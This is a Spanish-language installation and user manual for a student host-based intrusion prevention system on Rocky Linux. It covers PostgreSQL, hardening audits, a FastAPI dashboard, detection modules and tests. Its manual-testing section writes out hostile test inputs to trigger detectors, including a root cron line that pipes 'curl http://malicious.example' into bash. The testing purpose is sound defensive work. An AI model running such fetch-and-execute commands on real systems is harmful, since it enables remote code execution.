# Manual de instalacion y uso

## HIPS Rocky Linux

**Proyecto:** Sistema HIPS para Sistemas Operativos  
**Repositorio:** `https://github.com/LucasFadul/SO2_TP`  
**Sistema operativo:** Rocky Linux  
**Autor:** Lucas Fadul  
**Version del manual:** 1.0  
**Fecha:** junio de 2026

> Este documento constituye el manual impreso y digital de instalacion y uso
> del proyecto. Antes de imprimirlo o exportarlo a PDF, completar los datos de
> portada e insertar las capturas indicadas.

---

## Indice

1. Introduccion
2. Arquitectura general
3. Requisitos
4. Instalacion del proyecto
5. Configuracion de PostgreSQL
6. Configuracion local
7. Hardening
8. Ejecucion
9. Uso del dashboard
10. Modulos de deteccion
11. Modulo de prevencion
12. Logs y correo electronico
13. Pruebas
14. Consultas de administracion
15. Detencion y mantenimiento
16. Solucion de problemas
17. Lista de verificacion

---

# Parte I - Instalacion

## 1. Introduccion

Un HIPS, o *Host-based Intrusion Prevention System*, es un sistema de
seguridad que se ejecuta dentro de un equipo y analiza su actividad local.
Observa archivos, usuarios, procesos, interfaces de red, logs y otros recursos
para detectar comportamientos potencialmente peligrosos.

Este proyecto fue desarrollado para Rocky Linux y utiliza:

- Python para ejecutar la logica de deteccion y prevencion;
- PostgreSQL para guardar alarmas, acciones y configuraciones;
- FastAPI para publicar el dashboard web;
- firewalld y comandos del sistema para las acciones preventivas;
- SMTP para enviar alertas por correo;
- `/var/log/hips/` para almacenar las bitacoras formales.

El sistema se probo dentro de una maquina virtual Rocky Linux. Para reducir el
riesgo durante las demostraciones, las acciones preventivas pueden ejecutarse
en modo `dry-run`: se registra lo que el HIPS haria, pero no se modifica el
sistema.

## 2. Arquitectura general

El flujo principal es:

```text
Rocky Linux
    |
    v
main.py
    |
    v
10 modulos de deteccion
    |
    v
Alarma detectada
    |
    +--> PostgreSQL
    +--> /var/log/hips/alarmas.log
    +--> Email al administrador
    +--> Modulo de prevencion
             |
             +--> PostgreSQL
             +--> /var/log/hips/prevención.log
    |
    v
Dashboard FastAPI
```

`main.py` es el punto de entrada del HIPS. En cada ejecucion carga la
configuracion, consulta los diez modulos, registra las alarmas encontradas,
calcula la accion preventiva correspondiente, escribe los logs y envia la
notificacion.

El dashboard no realiza la deteccion. Su funcion es mostrar los resultados
guardados en PostgreSQL y permitir modificar los parametros operativos.

**Captura recomendada:** estructura del repositorio o diagrama de arquitectura.

## 3. Requisitos

### 3.1 Hardware recomendado para la maquina virtual

- 2 CPU virtuales;
- 4 GB de RAM;
- 30 GB de almacenamiento;
- adaptador de red activo;
- acceso a Internet durante la instalacion.

### 3.2 Software

- Rocky Linux;
- Git;
- Python 3 y pip;
- PostgreSQL Server;
- firewalld;
- auditd;
- navegador web en el equipo cliente.

Para determinadas pruebas tambien se utilizan:

- `tcpdump`, para probar el detector de sniffers;
- OpenSSH Server, para las pruebas de acceso;
- un servicio de correo o proveedor SMTP, para alertas reales.

## 4. Instalacion del proyecto

### 4.1 Actualizar Rocky Linux

```bash
sudo dnf update -y
```

`dnf` es el gestor de paquetes de Rocky Linux. El comando actualiza los
paquetes instalados y aplica correcciones disponibles.

### 4.2 Instalar paquetes base

```bash
sudo dnf install -y git python3 python3-pip postgresql-server postgresql-contrib
```

Funcion de cada paquete:

| Paquete | Funcion |
| --- | --- |
| `git` | Clona y actualiza el repositorio |
| `python3` | Ejecuta el HIPS |
| `python3-pip` | Instala dependencias de Python |
| `postgresql-server` | Proporciona el servidor PostgreSQL |
| `postgresql-contrib` | Agrega herramientas de PostgreSQL |

Paquetes usados para hardening y pruebas:

```bash
sudo dnf install -y audit tcpdump
```

**Captura recomendada:** terminal mostrando la instalacion completada.

### 4.3 Clonar el repositorio

Desde el directorio personal:

```bash
cd ~
git clone https://github.com/LucasFadul/SO2_TP.git
cd SO2_TP
```

Comprobar el contenido:

```bash
ls
```

Deben aparecer, entre otros:

```text
alerts  config  db  detection  docs  main.py  prevention  tests  web
```

Si el repositorio ya existe, no se debe volver a clonar encima. Para descargar
los cambios mas recientes se utiliza:

```bash
cd ~/SO2_TP
git pull
```

### 4.4 Crear el entorno virtual

```bash
cd ~/SO2_TP
python3 -m venv .venv
source .venv/bin/activate
```

El entorno virtual `.venv` aisla las dependencias del proyecto. Cuando esta
activo, el prompt muestra normalmente `(.venv)` y los paquetes instalados con
`pip` quedan dentro del repositorio, sin mezclarse con los paquetes globales.

### 4.5 Instalar dependencias Python

```bash
python3 -m pip install -r requirements.txt
```

Las principales dependencias son:

| Dependencia | Funcion |
| --- | --- |
| `fastapi` | Aplicacion web y endpoints |
| `uvicorn` | Servidor ASGI para FastAPI |
| `jinja2` | Renderizado de las paginas HTML |
| `psycopg` | Conexion entre Python y PostgreSQL |
| `python-dotenv` | Lectura del archivo `.env` |
| `python-multipart` | Procesamiento de formularios |
| `pytest` | Pruebas automatizadas |

Verificar:

```bash
python3 -m pip list
```

## 5. Configuracion de PostgreSQL

### 5.1 Inicializar y habilitar el servicio

La inicializacion se realiza una sola vez:

```bash
sudo postgresql-setup --initdb
sudo systemctl enable --now postgresql
```

El primer comando crea la estructura interna de PostgreSQL. El segundo inicia
el servicio y configura su arranque automatico.

Comprobar el estado:

```bash
sudo systemctl status postgresql
```

El resultado esperado incluye:

```text
Active: active (running)
```

### 5.2 Crear la base y el usuario de aplicacion

Entrar a PostgreSQL como administrador:

```bash
sudo -u postgres psql
```

Ejecutar:

```sql
CREATE DATABASE hips;
CREATE USER hips_app WITH PASSWORD 'CAMBIAR_POR_UNA_CLAVE_SEGURA';
GRANT ALL PRIVILEGES ON DATABASE hips TO hips_app;
\q
```

El usuario `postgres` se utiliza solo para tareas administrativas. El HIPS se
conecta como `hips_app`, evitando operar con permisos de superusuario.

### 5.3 Crear las tablas

Desde la raiz del repositorio:

```bash
cd ~/SO2_TP
sudo -u postgres psql -d hips < db/schema.sql
```

El archivo `db/schema.sql` crea:

| Tabla | Funcion |
| --- | --- |
| `alarmas` | Guarda las alarmas detectadas |
| `acciones_prevencion` | Guarda las respuestas preventivas |
| `configuracion_modulos` | Guarda los parametros del dashboard |
| `eventos_sistema` | Estructura para eventos procesables |
| `hosts_bloqueados` | Estructura para IP bloqueadas |
| `usuarios_web` | Estructura para usuarios de la interfaz |

### 5.4 Otorgar permisos a `hips_app`

Entrar a la base:

```bash
sudo -u postgres psql -d hips
```

Ejecutar:

```sql
GRANT USAGE ON SCHEMA public TO hips_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO hips_app;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO hips_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO hips_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE, SELECT ON SEQUENCES TO hips_app;
\q
```

Los permisos permiten que la aplicacion consulte e inserte datos sin convertir
a `hips_app` en administrador.

### 5.5 Configurar autenticacion local

Consultar la ubicacion activa:

```bash
sudo -u postgres psql -d hips -c "SHOW hba_file;"
```

En una instalacion estandar de Rocky Linux suele ser:

```text
/var/lib/pgsql/data/pg_hba.conf
```

Las conexiones locales TCP deben usar contraseña segura:

```text
host    all    all    127.0.0.1/32    scram-sha-256
host    all    all    ::1/128         scram-sha-256
```

Recargar PostgreSQL:

```bash
sudo systemctl reload postgresql
```

### 5.6 Verificar las tablas

```bash
sudo -u postgres psql -d hips -c "\dt"
```

**Captura recomendada:** lista de relaciones creada por PostgreSQL.

## 6. Configuracion local

### 6.1 Crear `.env`

```bash
cd ~/SO2_TP
cp .env.example .env
```

Editar:

```bash
nano .env
```

Configuracion minima:

```dotenv
HIPS_PROJECT_NAME=hips_rocky
HIPS_ENV=development

HIPS_DB_HOST=localhost
HIPS_DB_PORT=5432
HIPS_DB_NAME=hips
HIPS_DB_USER=hips_app
HIPS_DB_PASSWORD=CAMBIAR_POR_LA_CLAVE_REAL

HIPS_LOG_DIR=/var/log/hips

HIPS_PREVENTION_DRY_RUN=true

HIPS_EMAIL_DRY_RUN=true
HIPS_SMTP_HOST=localhost
HIPS_SMTP_PORT=25
HIPS_SMTP_TIMEOUT=10
HIPS_SMTP_STARTTLS=false
HIPS_SMTP_USER=
HIPS_SMTP_PASSWORD=
HIPS_ALERT_FROM=hips@localhost
HIPS_ALERT_TO=admin@localhost
```

El archivo `.env` contiene datos propios de la instalacion y no se sube a Git.
`.env.example` se incluye como plantilla, pero no debe contener contraseñas
reales.

Los umbrales de los diez modulos se administran desde `/config` y se guardan en
PostgreSQL.

### 6.2 Configurar correo real

Para usar un proveedor SMTP se deben completar los valores entregados por ese
proveedor. Ejemplo general:

```dotenv
HIPS_EMAIL_DRY_RUN=false
HIPS_SMTP_HOST=smtp.example.com
HIPS_SMTP_PORT=587
HIPS_SMTP_TIMEOUT=10
HIPS_SMTP_STARTTLS=true
HIPS_SMTP_USER=usuario@example.com
HIPS_SMTP_PASSWORD=CLAVE_DE_APLICACION
HIPS_ALERT_FROM=usuario@example.com
HIPS_ALERT_TO=administrador@example.com
```

No se debe usar ni mostrar la contraseña principal de una cuenta. Cuando el
proveedor lo permita, se utiliza una contraseña de aplicacion.

### 6.3 Probar la conexion

Con el entorno virtual activo:

```bash
python3 -c "from db.models import get_connection; c=get_connection(); print('PostgreSQL OK'); c.close()"
```

Resultado esperado:

```text
PostgreSQL OK
```

## 7. Hardening

El TP exige al menos diez controles sobre Rocky Linux y siete buenas practicas
sobre PostgreSQL. Los scripts incluidos auditan el estado; no modifican el
sistema.

### 7.1 Auditoria de Rocky Linux

```bash
cd ~/SO2_TP
bash scripts/audit_rocky_hardening.sh
```

Controles revisados:

1. SELinux en modo `Enforcing`;
2. firewalld activo;
3. puertos y servicios permitidos;
4. login SSH de root deshabilitado;
5. autenticacion SSH;
6. privilegios sudo;
7. auditd activo;
8. auditoria de `/etc/passwd` y `/etc/shadow`;
9. opciones de montaje de `/tmp`;
10. actualizaciones de seguridad disponibles.

### 7.2 Auditoria de PostgreSQL

```bash
bash scripts/audit_postgres_hardening.sh
```

Se verifica el usuario de aplicacion, cifrado de contraseñas, interfaces de
escucha, SSL, logs de conexiones y reglas de `pg_hba.conf`.

La explicacion y los comandos de ajuste se encuentran en:

```text
docs/hardening.md
```

### 7.3 Firewall para el dashboard

```bash
sudo systemctl enable --now firewalld
sudo firewall-cmd --add-service=ssh --permanent
sudo firewall-cmd --add-port=8000/tcp --permanent
sudo firewall-cmd --reload
```

El puerto `8000/tcp` debe abrirse solamente en el entorno de demostracion o en
una red confiable.

---

# Parte II - Manual de uso

## 8. Ejecucion

El proyecto tiene dos procesos independientes:

1. `main.py`: ejecuta una ronda de deteccion;
2. Uvicorn: mantiene disponible el dashboard.

### 8.1 Ejecutar una ronda del HIPS

Desde Rocky Linux:

```bash
cd ~/SO2_TP
sudo .venv/bin/python3 main.py
```

Se utiliza el Python de `.venv` de forma explicita porque `sudo python3`
utilizaria el Python global de root, que puede no tener las dependencias.

`sudo` permite leer logs protegidos como `/var/log/secure` y escribir en
`/var/log/hips/`. Durante la demostracion se recomienda mantener:

```dotenv
HIPS_PREVENTION_DRY_RUN=true
```

Salida esperada:

```text
HIPS iniciado
file_integrity: 0 alarmas
users_monitor: 0 alarmas
sniffer_detect: 0 alarmas
log_analyzer: 0 alarmas
mail_queue: 0 alarmas
process_monitor: 0 alarmas
tmp_monitor: 0 alarmas
ddos_detect: 0 alarmas
cron_monitor: 0 alarmas
access_monitor: 0 alarmas

Alarmas registradas: 0

Ver dashboard para detalles.
```

`main.py` realiza una ronda y finaliza. Para analizar nuevos eventos se vuelve
a ejecutar. El sistema guarda offsets de determinados logs para evitar releer
todo el archivo.

### 8.2 Levantar el dashboard

En otra terminal:

```bash
cd ~/SO2_TP
source .venv/bin/activate
uvicorn web.app:app --host 0.0.0.0 --port 8000
```

No cerrar esa terminal mientras se utiliza el dashboard.

Verificar desde Rocky:

```bash
curl http://127.0.0.1:8000/health
```

Resultado:

```json
{"status":"ok"}
```

### 8.3 Obtener la IP de Rocky

```bash
ip a
```

Buscar la direccion `inet` de la interfaz activa, por ejemplo:

```text
inet 192.168.64.7/24
```

Desde un equipo que pueda alcanzar la red de la VM:

```text
http://192.168.64.7:8000
```

La direccion puede cambiar si la maquina virtual utiliza DHCP.

## 9. Uso del dashboard

### 9.1 Pantalla Alarmas

La pagina principal muestra:

| Campo | Significado |
| --- | --- |
| ID | Identificador de PostgreSQL |
| Timestamp | Fecha y hora de deteccion |
| Tipo | Nombre normalizado de la alarma |
| IP origen | IP relacionada, si existe |
| Modulo | Detector que genero la alarma |
| Severidad | Nivel de riesgo |
| Detalle | Informacion concreta del evento |
| Accion tomada | Prevencion asociada |
| Resuelta | Estado de la alarma |

Los filtros permiten seleccionar un modulo y un rango temporal. El dashboard
muestra los registros guardados en PostgreSQL; no lee directamente los logs.

**Captura recomendada:** dashboard con alarmas de varios modulos.

### 9.2 Pantalla Configuracion

Abrir:

```text
http://<IP_ROCKY>:8000/config
```

La pantalla permite:

- abrir y cerrar las secciones de los modulos;
- cambiar rutas, listas y umbrales;
- guardar la configuracion;
- restaurar valores predeterminados.

Los cambios se guardan en `configuracion_modulos`. Tienen prioridad sobre los
valores predeterminados del codigo.

Para aplicar un nuevo umbral:

1. modificar el campo;
2. presionar `Guardar configuracion`;
3. ejecutar nuevamente `main.py`.

## 10. Modulos de deteccion

| Modulo | Fuente principal | Detecta | Alarma |
| --- | --- | --- | --- |
| Integridad de Archivos | Hash SHA-256 | Cambios en archivos criticos | `MODIFICACION_ARCHIVO` |
| Usuarios Conectados | `who`, `/etc/passwd` | Usuarios, origenes o sesiones sospechosas | `USUARIO_SOSPECHOSO` |
| Sniffers de Red | `ip link`, `ps aux` | Sniffers o modo promiscuo | `SNIFFER_DETECTADO` |
| Analisis de Logs | Logs SSH, web y mail | Fallos, scanners y anomalias | Varias |
| Cola de Correo | `mailq` | Cola excesiva | `MAIL_QUEUE_ALTA` |
| Procesos de Alto Consumo | `ps` | CPU o RAM superior al limite | `PROCESO_ALTO_CONSUMO` |
| Directorio Temporal | `/tmp` | Scripts o ejecutables | `ARCHIVO_TMP_SOSPECHOSO` |
| Deteccion DDoS | Log DNS | Solicitudes repetidas por IP | `DDOS_DETECTADO` |
| Tareas Cron | Archivos cron | Comandos sospechosos | `CRON_SOSPECHOSO` |
| Accesos Invalidos | `/var/log/secure` | Reintentos y credential stuffing | Varias |

La descripcion completa de las condiciones, falsos positivos y fuentes de
datos se encuentra en:

```text
docs/modulos.md
```

## 11. Modulo de prevencion

Cada alarma se asocia, cuando corresponde, con una accion:

| Deteccion | Accion |
| --- | --- |
| IP sospechosa | `block_ip` |
| Usuario sospechoso | `lock_user` |
| Sniffer o proceso peligroso | `kill_process` |
| Interfaz promiscua | `disable_promisc` |
| Archivo sospechoso | `quarantine_file` |
| Archivo critico modificado | `protect_file` |
| Cola de correo elevada | `stop_service` |

En modo seguro:

```dotenv
HIPS_PREVENTION_DRY_RUN=true
```

la accion se calcula y se registra, pero no se ejecuta. Esto permite demostrar
la decision del HIPS sin bloquear la IP de la Mac, cerrar sesiones, matar
procesos importantes o modificar archivos reales.

Consultar las acciones:

```bash
sudo -u postgres psql -d hips -c \
"SELECT id, alarma_id, accion, timestamp, resultado, ejecutada_por
 FROM acciones_prevencion
 ORDER BY id DESC
 LIMIT 10;"
```

**Captura recomendada:** resultado de la consulta anterior.

## 12. Logs y correo electronico

### 12.1 Logs formales

El HIPS crea:

```text
/var/log/hips/alarmas.log
/var/log/hips/prevención.log
/var/log/hips/alarmas.jsonl
/var/log/hips/prevencion.jsonl
```

Los archivos `.log` son legibles por personas. Los `.jsonl` contienen un
objeto JSON por linea y pueden procesarse con otras herramientas.

Ultimas alarmas:

```bash
sudo tail -n 10 /var/log/hips/alarmas.log
```

Ultimas acciones:

```bash
sudo tail -n 10 /var/log/hips/prevención.log
```

Monitoreo en tiempo real:

```bash
sudo tail -f /var/log/hips/alarmas.log
```

Los logs contienen solamente eventos generados desde que se integro y ejecuto
el logger. PostgreSQL puede contener alarmas anteriores; por eso la cantidad
historica puede no coincidir.

### 12.2 Alertas por email

Por cada alarma, `alerts/mailer.py` construye un correo con:

- tipo de alarma;
- modulo;
- IP de origen;
- severidad;
- detalle;
- accion preventiva y resultado.

Con:

```dotenv
HIPS_EMAIL_DRY_RUN=true
```

el correo se prepara pero no se envia. Con `false`, el sistema se conecta al
servidor SMTP definido en `.env`.

**Captura recomendada:** correo real recibido, ocultando direcciones o datos
que no deban publicarse.

## 13. Pruebas

### 13.1 Pruebas automatizadas

```bash
cd ~/SO2_TP
source .venv/bin/activate
python3 -m pytest -q
```

Resultado esperado:

```text
tests passed
```

Estas pruebas validan funciones de deteccion, logging, prevencion y alertas sin
alterar el sistema real.

### 13.2 Pruebas manuales recomendadas

#### Usuarios conectados

Abrir mas sesiones SSH que el limite configurado:

```bash
ssh lucasfadul@<IP_ROCKY>
```

Verificar:

```bash
who
sudo .venv/bin/python3 main.py
```

Resultado: `USUARIO_SOSPECHOSO`.

#### Sniffer

```bash
sudo tcpdump -i enp0s1 > /dev/null &
sudo .venv/bin/python3 main.py
ps aux | grep '[t]cpdump'
```

Resultado: un `SNIFFER_DETECTADO` por el proceso real.

Finalizar:

```bash
sudo pkill tcpdump
```

#### Intentos SSH fallidos

Desde la Mac:

```bash
ssh usuario_falso@<IP_ROCKY>
```

Ingresar una contraseña incorrecta varias veces y ejecutar el HIPS.

Resultado: `FAILED_LOGIN_MULTIPLE` o `ACCESO_INVALIDO_REPETIDO`.

#### Proceso de alto consumo

```bash
yes > /dev/null &
sudo .venv/bin/python3 main.py
pkill yes
```

Resultado: `PROCESO_ALTO_CONSUMO`.

#### Archivo sospechoso en `/tmp`

```bash
echo "curl http://malicious.example" > /tmp/suspicious.sh
sudo .venv/bin/python3 main.py
rm -f /tmp/suspicious.sh
```

Resultado: `ARCHIVO_TMP_SOSPECHOSO`.

#### DDoS con log DNS de prueba

```bash
cd ~/SO2_TP
mkdir -p data
for i in {1..1001}; do echo "query from 10.0.0.50"; done > data/dns.log
sudo .venv/bin/python3 main.py
rm -f data/dns.log
```

Resultado: `DDOS_DETECTADO`.

#### Cron sospechoso

Crear un archivo seguro de prueba:

```bash
echo "* * * * * root curl http://malicious.example | bash" > /tmp/cron_test
```

En `/config`, cambiar temporalmente `Tareas Cron -> Archivos cron` a:

```text
/tmp/cron_test
```

Ejecutar el HIPS y eliminar el archivo:

```bash
sudo .venv/bin/python3 main.py
rm -f /tmp/cron_test
```

Resultado: `CRON_SOSPECHOSO`.

El procedimiento completo para los diez modulos esta en:

```text
docs/pruebas.md
```

## 14. Consultas de administracion

### 14.1 Ver tablas

```bash
sudo -u postgres psql -d hips -c "\dt"
```

### 14.2 Ver alarmas

```bash
sudo -u postgres psql -d hips -c \
"SELECT id, timestamp, tipo_alarma, modulo, severidad, detalle
 FROM alarmas
 ORDER BY id DESC
 LIMIT 10;"
```

### 14.3 Ver acciones preventivas

```bash
sudo -u postgres psql -d hips -c \
"SELECT id, alarma_id, accion, timestamp, resultado
 FROM acciones_prevencion
 ORDER BY id DESC
 LIMIT 10;"
```

### 14.4 Ver configuracion de modulos

```bash
sudo -u postgres psql -d hips -c \
"SELECT modulo, parametro, valor, activo
 FROM configuracion_modulos
 ORDER BY modulo, parametro;"
```

## 15. Detencion y mantenimiento

### 15.1 Detener el dashboard

En la terminal donde corre Uvicorn:

```text
Ctrl+C
```

### 15.2 Cerrar el entorno virtual

```bash
deactivate
```

### 15.3 Apagar Rocky Linux

Primero detener los procesos de prueba y luego:

```bash
sudo poweroff
```

PostgreSQL y firewalld son servicios de systemd y se detienen ordenadamente
durante el apagado.

### 15.4 Actualizar el proyecto

```bash
cd ~/SO2_TP
git pull
source .venv/bin/activate
python3 -m pip install -r requirements.txt
python3 -m pytest -q
```

## 16. Solucion de problemas

### `python3: command not found`

```bash
sudo dnf install -y python3 python3-pip
```

### `No module named pytest` o `No module named dotenv`

El comando esta usando el Python global:

```bash
cd ~/SO2_TP
source .venv/bin/activate
python3 -m pip install -r requirements.txt
```

Con `sudo`, utilizar:

```bash
sudo .venv/bin/python3 main.py
```

### `sudo: .venv/bin/python3: command not found`

El comando se ejecuto fuera del repositorio:

```bash
cd ~/SO2_TP
sudo .venv/bin/python3 main.py
```

### PostgreSQL: `role does not exist`

La conexion intento usar el usuario Linux. Utilizar el usuario correcto o
administrar con:

```bash
sudo -u postgres psql -d hips
```

### PostgreSQL: `Ident authentication failed`

Revisar `pg_hba.conf`, usar `scram-sha-256` para localhost y recargar:

```bash
sudo systemctl reload postgresql
```

### PostgreSQL: `Permission denied` al importar `schema.sql`

Ejecutar desde el repositorio y usar redireccion de la shell:

```bash
cd ~/SO2_TP
sudo -u postgres psql -d hips < db/schema.sql
```

### El dashboard no abre

1. comprobar que Uvicorn sigue activo;
2. ejecutar `curl http://127.0.0.1:8000/health`;
3. consultar la IP con `ip a`;
4. verificar el firewall:

```bash
sudo firewall-cmd --list-all
```

### No aparece una alarma nueva

- confirmar que la condicion supera el umbral de `/config`;
- ejecutar nuevamente `main.py`;
- revisar si el detector usa offsets y solo analiza lineas nuevas;
- comprobar permisos de lectura;
- consultar PostgreSQL y `/var/log/hips/`.

### Aparecen alarmas repetidas

`main.py` registra el estado observado en cada ejecucion. Si la condicion sigue
activa, puede generar otra alarma. Antes de repetir una prueba, eliminar el
evento de prueba o cerrar el proceso/sesion que lo produce.

## 17. Lista de verificacion

Antes de la entrega:

- [ ] El manual tiene portada, autor y fecha.
- [ ] El mismo documento se exporto a PDF.
- [ ] Existe una copia impresa.
- [ ] `.env` existe y no contiene errores.
- [ ] No se publicaron contraseñas reales.
- [ ] PostgreSQL esta activo.
- [ ] Las tablas existen.
- [ ] `hips_app` puede insertar y consultar.
- [ ] Los tests pasan.
- [ ] `main.py` ejecuta los diez modulos.
- [ ] El dashboard abre desde el equipo de presentacion.
- [ ] `/config` guarda y restaura parametros.
- [ ] Los logs existen en `/var/log/hips/`.
- [ ] Se recibio al menos un correo de prueba.
- [ ] `HIPS_PREVENTION_DRY_RUN=true` durante la demostracion.
- [ ] Las pruebas manuales estan preparadas.
- [ ] Las capturas no muestran contraseñas.

---

## Documentos complementarios

```text
docs/modulos.md
docs/pruebas.md
docs/hardening.md
docs/mapa_prevencion.md
docs/guia_presentacion.md
```
